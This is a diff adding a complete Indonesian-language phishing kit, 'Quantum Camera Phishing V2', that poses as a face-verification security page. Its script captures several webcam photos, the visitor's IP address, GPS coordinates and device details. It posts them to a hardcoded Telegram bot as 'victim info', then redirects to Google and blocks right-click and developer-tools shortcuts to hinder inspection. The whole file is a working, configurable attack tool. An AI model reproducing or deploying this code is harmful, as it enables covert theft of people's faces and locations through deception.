@@ -1,0 +1,837 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>? QUANTUM CAMERA PHISHING V2 ?</title>
+    <style>
+        /* Style sama kayak sebelumnya, tambahin dikit */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.3);
+            backdrop-filter: blur(8px);
+            z-index: 1;
+        }
+        
+        .container {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            max-width: 450px;
+            margin: 20px;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: slideUp 0.5s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+            font-weight: bold;
+            box-shadow: 0 10px 30px rgba(30, 60, 114, 0.4);
+        }
+        
+        .warning-box {
+            background: #fff3cd;
+            border: 1px solid #ffeeba;
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 25px;
+            color: #856404;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .camera-container {
+            position: relative;
+            width: 100%;
+            height: 300px;
+            background: #1a1a1a;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            border: 3px solid #1e3c72;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .camera-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, rgba(30, 60, 114, 0.2) 0%, rgba(42, 82, 152, 0.2) 100%);
+            pointer-events: none;
+        }
+        
+        .face-frame {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 200px;
+            height: 200px;
+            border: 3px solid rgba(30, 60, 114, 0.8);
+            border-radius: 50%;
+            box-shadow: 0 0 0 9999px rgba(0,0,0,0.5);
+            pointer-events: none;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                border-color: rgba(30, 60, 114, 0.8);
+                box-shadow: 0 0 0 9999px rgba(0,0,0,0.5), 0 0 0 0 rgba(30, 60, 114, 0.4);
+            }
+            70% {
+                border-color: rgba(30, 60, 114, 1);
+                box-shadow: 0 0 0 9999px rgba(0,0,0,0.5), 0 0 0 20px rgba(30, 60, 114, 0);
+            }
+            100% {
+                border-color: rgba(30, 60, 114, 0.8);
+                box-shadow: 0 0 0 9999px rgba(0,0,0,0.5), 0 0 0 0 rgba(30, 60, 114, 0);
+            }
+        }
+        
+        .camera-controls {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            box-shadow: 0 10px 20px rgba(30, 60, 114, 0.3);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 30px rgba(30, 60, 114, 0.4);
+        }
+        
+        .btn-secondary {
+            background: #f0f0f0;
+            color: #666;
+        }
+        
+        .btn-secondary:hover {
+            background: #e0e0e0;
+        }
+        
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin: 25px 0;
+            position: relative;
+        }
+        
+        .steps::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e0e0e0;
+            z-index: 1;
+        }
+        
+        .step {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            flex: 1;
+        }
+        
+        .step-number {
+            width: 30px;
+            height: 30px;
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+            font-weight: bold;
+            color: #666;
+        }
+        
+        .step.active .step-number {
+            background: #1e3c72;
+            border-color: #1e3c72;
+            color: white;
+        }
+        
+        .step.completed .step-number {
+            background: #28a745;
+            border-color: #28a745;
+            color: white;
+        }
+        
+        .step-label {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        #canvas {
+            display: none;
+        }
+        
+        .loading {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.95);
+            z-index: 10;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .loading.show {
+            display: flex;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #1e3c72;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .success-message.show {
+            display: block;
+        }
+        
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: #28a745;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 40px;
+            animation: scaleIn 0.5s ease;
+        }
+        
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255,255,255,0.8);
+            font-size: 12px;
+        }
+        
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .badge {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #666;
+            font-size: 12px;
+        }
+        
+        .badge i {
+            color: #28a745;
+        }
+        
+        /* Status pengiriman */
+        .status-text {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="overlay"></div>
+    
+    <div class="container">
+        <div class="card">
+            <!-- Loading -->
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <div style="color: #333; font-weight: 600;" id="loadingText">Mengakses kamera...</div>
+                <div style="color: #666; font-size: 14px;" id="loadingSubtext">Mohon izinkan akses kamera</div>
+            </div>
+            
+            <!-- Success -->
+            <div class="success-message" id="successMessage">
+                <div class="success-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                <h2 style="color: #333; margin-bottom: 10px;">Verifikasi Berhasil!</h2>
+                <p style="color: #666; margin-bottom: 20px;">Terima kasih, identitas Anda telah terverifikasi.</p>
+                <div style="color: #999; font-size: 14px;" id="redirectMessage">Mengalihkan dalam <span id="countdown">3</span> detik...</div>
+            </div>
+            
+            <!-- Main Content -->
+            <div id="mainContent">
+                <div class="logo">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                
+                <div class="header">
+                    <h1>Verifikasi Keamanan</h1>
+                    <div class="subtitle">Lakukan verifikasi wajah untuk melanjutkan</div>
+                </div>
+                
+                <div class="warning-box">
+                    <i class="fas fa-info-circle"></i>
+                    <div>Demi keamanan akun Anda, kami perlu melakukan verifikasi wajah. Proses ini membutuhkan akses kamera.</div>
+                </div>
+                
+                <div class="steps">
+                    <div class="step active" id="step1">
+                        <div class="step-number">1</div>
+                        <div class="step-label">Akses Kamera</div>
+                    </div>
+                    <div class="step" id="step2">
+                        <div class="step-number">2</div>
+                        <div class="step-label">Verifikasi Wajah</div>
+                    </div>
+                    <div class="step" id="step3">
+                        <div class="step-number">3</div>
+                        <div class="step-label">Selesai</div>
+                    </div>
+                </div>
+                
+                <div class="camera-container">
+                    <video id="video" autoplay playsinline></video>
+                    <div class="camera-overlay"></div>
+                    <div class="face-frame" id="faceFrame"></div>
+                </div>
+                
+                <div style="text-align: center; color: #666; font-size: 14px; margin-bottom: 15px;">
+                    <i class="fas fa-camera"></i> Posisikan wajah Anda dalam lingkaran
+                </div>
+                
+                <div class="camera-controls">
+                    <button class="btn btn-primary" id="captureBtn" onclick="captureImage()">
+                        <i class="fas fa-camera"></i> Ambil Foto
+                    </button>
+                    <button class="btn btn-secondary" id="retryBtn" onclick="retryCamera()" style="display: none;">
+                        <i class="fas fa-redo"></i> Ulangi
+                    </button>
+                </div>
+                
+                <div class="status-text" id="statusText">
+                    <i class="fas fa-circle-notch fa-spin"></i> Menunggu akses kamera...
+                </div>
+                
+                <div class="trust-badges">
+                    <div class="badge">
+                        <i class="fas fa-lock"></i> 256-bit SSL
+                    </div>
+                    <div class="badge">
+                        <i class="fas fa-shield-alt"></i> Aman
+                    </div>
+                    <div class="badge">
+                        <i class="fas fa-check-circle"></i> Terverifikasi
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <i class="fas fa-copyright"></i> 2024 Sistem Keamanan | All rights reserved
+            <br>
+            <span style="font-size: 10px;">Copyright c RianModss</span>
+        </div>
+    </div>
+    
+    <canvas id="canvas" width="640" height="480"></canvas>
+    
+    <script>
+        // ============= KONFIGURASI =============
+        // GANTI INI PAKE TOKEN BOT TELEGRAM LU!
+        const TELEGRAM_BOT_TOKEN = '8775936504:AAH81TK_160V8IWI7Z6VPHDOp9lPr4CZ_BA'; // Ganti bang!
+        const TELEGRAM_CHAT_ID = '1023675882'; // Ganti pake chat ID lu
+        
+        // Opsi tambahan
+        const CAPTURE_COUNT = 3; // Jumlah foto yang diambil (1-5)
+        const CAPTURE_DELAY = 500; // Delay antar foto (ms)
+        const REDIRECT_URL = 'https://www.google.com'; // URL setelah selesai
+        
+        // ============= VARIABEL =============
+        let stream = null;
+        let currentStep = 1;
+        let capturedImages = [];
+        let captureStatus = document.getElementById('statusText');
+        let loadingEl = document.getElementById('loading');
+        let loadingText = document.getElementById('loadingText');
+        let loadingSubtext = document.getElementById('loadingSubtext');
+        
+        // ============= FUNGSI UTAMA =============
+        document.addEventListener('DOMContentLoaded', async function() {
+            updateStatus('Meminta akses kamera...', 'Mohon izinkan akses kamera di browser Anda');
+            await startCamera();
+        });
+        
+        async function startCamera() {
+            try {
+                updateStatus('Mengakses kamera...', 'Mencoba mendapatkan akses kamera');
+                
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    },
+                    audio: false
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                updateStep(2);
+                updateStatus('Kamera siap', 'Tekan tombol "Ambil Foto" untuk memulai verifikasi');
+                
+                // Sembunyikan loading
+                loadingEl.classList.remove('show');
+                
+            } catch (err) {
+                console.error('Camera error:', err);
+                loadingEl.classList.remove('show');
+                
+                let errorMsg = 'Tidak dapat mengakses kamera. ';
+                if (err.name === 'NotAllowedError') {
+                    errorMsg += 'Izin kamera ditolak. Silakan izinkan akses kamera dan coba lagi.';
+                } else if (err.name === 'NotFoundError') {
+                    errorMsg += 'Kamera tidak ditemukan.';
+                } else {
+                    errorMsg += 'Terjadi kesalahan.';
+                }
+                
+                alert(errorMsg);
+                updateStatus('Gagal akses kamera', 'Klik tombol Ulangi untuk mencoba lagi');
+                
+                // Tampilkan tombol retry
+                document.getElementById('retryBtn').style.display = 'block';
+                document.getElementById('captureBtn').style.display = 'none';
+            }
+        }
+        
+        function updateStep(step) {
+            currentStep = step;
+            
+            document.getElementById('step1').classList.remove('active', 'completed');
+            document.getElementById('step2').classList.remove('active', 'completed');
+            document.getElementById('step3').classList.remove('active', 'completed');
+            
+            if (step === 1) {
+                document.getElementById('step1').classList.add('active');
+            } else if (step === 2) {
+                document.getElementById('step1').classList.add('completed');
+                document.getElementById('step2').classList.add('active');
+            } else if (step === 3) {
+                document.getElementById('step1').classList.add('completed');
+                document.getElementById('step2').classList.add('completed');
+                document.getElementById('step3').classList.add('active');
+            }
+        }
+        
+        function updateStatus(mainText, subText) {
+            if (mainText) loadingText.textContent = mainText;
+            if (subText) loadingSubtext.textContent = subText;
+        }
+        
+        async function captureImage() {
+            if (!stream) {
+                alert('Kamera tidak tersedia');
+                return;
+            }
+            
+            // Reset array
+            capturedImages = [];
+            
+            // Tampilkan loading
+            loadingEl.classList.add('show');
+            updateStatus('Mengambil foto...', 'Harap tetap diam');
+            
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            // Ambil foto sesuai jumlah yang ditentukan
+            for (let i = 0; i < CAPTURE_COUNT; i++) {
+                updateStatus(`Mengambil foto ${i+1} dari ${CAPTURE_COUNT}...`, 'Harap tetap diam');
+                
+                // Gambar frame ke canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Convert ke JPEG dengan kualitas 0.9
+                const imageData = canvas.toDataURL('image/jpeg', 0.9);
+                capturedImages.push(imageData);
+                
+                // Delay antar foto
+                if (i < CAPTURE_COUNT - 1) {
+                    await new Promise(resolve => setTimeout(resolve, CAPTURE_DELAY));
+                }
+            }
+            
+            updateStep(3);
+            updateStatus('Mengirim data...', 'Harap tunggu sebentar');
+            
+            // Kirim ke Telegram
+            await sendAllToTelegram();
+            
+            // Selesai
+            loadingEl.classList.remove('show');
+            
+            // Stop kamera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Tampilkan pesan sukses
+            document.getElementById('mainContent').style.display = 'none';
+            document.getElementById('successMessage').classList.add('show');
+            
+            // Countdown redirect
+            let countdown = 3;
+            const countdownEl = document.getElementById('countdown');
+            const timer = setInterval(() => {
+                countdown--;
+                countdownEl.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(timer);
+                    window.location.href = REDIRECT_URL;
+                }
+            }, 1000);
+        }
+        
+        async function sendAllToTelegram() {
+            try {
+                // Dapatkan info tambahan
+                const ip = await getIP();
+                const location = await getLocation();
+                const deviceInfo = getDeviceInfo();
+                const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+                
+                // Kirim setiap foto
+                for (let i = 0; i < capturedImages.length; i++) {
+                    await sendSingleToTelegram(capturedImages[i], i + 1, {
+                        ip,
+                        location,
+                        ...deviceInfo,
+                        timestamp
+                    });
+                    
+                    // Delay antar pengiriman biar nggak kena limit
+                    if (i < capturedImages.length - 1) {
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                }
+                
+                // Kirim summary
+                await sendSummary(ip, location, deviceInfo, timestamp);
+                
+            } catch (error) {
+                console.error('Gagal kirim ke Telegram:', error);
+                // Fallback: simpan ke localStorage
+                saveToLocalStorage();
+            }
+        }
+        
+        async function sendSingleToTelegram(imageData, index, info) {
+            // Convert base64 ke blob
+            const blob = dataURLToBlob(imageData);
+            
+            // Buat form data
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, `face_${index}_${Date.now()}.jpg`);
+            
+            // Caption dengan info korban
+            const caption = 
+                `?? *FACE CAPTURE #${index}* ?\n` +
+                `����������������������������������������\n` +
+                `?? *Waktu:* ${info.timestamp}\n` +
+                `?? *IP Address:* ${info.ip || 'Unknown'}\n` +
+                `?? *Lokasi:* ${info.location || 'Unknown'}\n` +
+                `?? *Device:* ${info.device || 'Unknown'}\n` +
+                `?? *OS:* ${info.os || 'Unknown'}\n` +
+                `?? *Browser:* ${info.browser || 'Unknown'}\n` +
+                `?? *Screen:* ${info.screen || 'Unknown'}\n` +
+                `����������������������������������������\n` +
+                `? *Quantum V12.0 - RianModss* ?`;
+            
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
+            
+            // Kirim
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const result = await response.json();
+            console.log(`Foto ${index} terkirim:`, result);
+            
+            return result;
+        }
+        
+        async function sendSummary(ip, location, deviceInfo, timestamp) {
+            // Kirim pesan ringkasan
+            const summaryText = 
+                `?? *SUMMARY REPORT* ??\n` +
+                `����������������������������������������\n` +
+                `?? *Total Photos:* ${capturedImages.length}\n` +
+                `?? *Waktu Kejadian:* ${timestamp}\n` +
+                `?? *IP Publik:* ${ip || 'Unknown'}\n` +
+                `?? *Lokasi:* ${location || 'Unknown'}\n` +
+                `?? *Detail Device:*\n` +
+                `? User Agent: ${deviceInfo.ua || 'Unknown'}\n` +
+                `? Platform: ${deviceInfo.platform || 'Unknown'}\n` +
+                `? Bahasa: ${deviceInfo.language || 'Unknown'}\n` +
+                `? Screen: ${deviceInfo.screen || 'Unknown'}\n` +
+                `����������������������������������������\n` +
+                `? *Quantum V12.0 - RianModss* ?`;
+            
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('text', summaryText);
+            formData.append('parse_mode', 'Markdown');
+            
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+        
+        // ============= FUNGSI PEMBANTU =============
+        function dataURLToBlob(dataURL) {
+            const parts = dataURL.split(';base64,');
+            const contentType = parts[0].split(':')[1];
+            const raw = window.atob(parts[1]);
+            const rawLength = raw.length;
+            const uInt8Array = new Uint8Array(rawLength);
+            
+            for (let i = 0; i < rawLength; ++i) {
+                uInt8Array[i] = raw.charCodeAt(i);
+            }
+            
+            return new Blob([uInt8Array], { type: contentType });
+        }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Gagal mendapatkan IP';
+            }
+        }
+        
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('Geolocation tidak didukung');
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        resolve(`${lat}, ${lon} (https://maps.google.com/?q=${lat},${lon})`);
+                    },
+                    (error) => {
+                        resolve('Tidak dapat mengakses lokasi');
+                    }
+                );
+            });
+        }
+        
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown';
+            let browser = 'Unknown';
+            
+            // Deteksi OS
+            if (ua.indexOf('Win') !== -1) os = 'Windows';
+            else if (ua.indexOf('Mac') !== -1) os = 'macOS';
+            else if (ua.indexOf('Linux') !== -1) os = 'Linux';
+            else if (ua.indexOf('Android') !== -1) os = 'Android';
+            else if (ua.indexOf('iOS') !== -1) os = 'iOS';
+            
+            // Deteksi Browser
+            if (ua.indexOf('Chrome') !== -1) browser = 'Chrome';
+            else if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
+            else if (ua.indexOf('Safari') !== -1) browser = 'Safari';
+            else if (ua.indexOf('Edge') !== -1) browser = 'Edge';
+            
+            return {
+                ua: ua,
+                os: os,
+                browser: browser,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                device: /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop'
+            };
+        }
+        
+        function saveToLocalStorage() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                images: capturedImages,
+                deviceInfo: getDeviceInfo()
+            };
+            localStorage.setItem('quantum_camera_data', JSON.stringify(data));
+            alert('Data disimpan di localStorage karena gagal kirim ke Telegram');
+        }
+        
+        function retryCamera() {
+            // Reset
+            capturedImages = [];
+            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('successMessage').classList.remove('show');
+            document.getElementById('retryBtn').style.display = 'none';
+            document.getElementById('captureBtn').style.display = 'block';
+            
+            updateStep(1);
+            
+            // Start camera lagi
+            loadingEl.classList.add('show');
+            updateStatus('Meminta akses kamera...', 'Mohon izinkan akses kamera');
+            startCamera();
+        }
+        
+        // Anti inspect
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
